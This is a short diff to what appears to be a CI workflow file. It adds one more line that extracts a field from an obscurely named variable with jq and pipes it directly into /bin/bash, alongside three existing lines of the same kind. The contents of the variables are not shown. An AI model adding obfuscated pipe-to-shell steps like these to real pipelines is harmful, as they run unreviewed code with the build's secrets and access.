@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$ipo3259" | jq -r .p828 | /bin/bash
           printf '%s' "$kodk81" | jq -r .sxvva6 | /bin/bash
           echo $fx4 | jq -r .xs9 | /bin/bash
+          echo $tbi66 | jq -r .l6 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
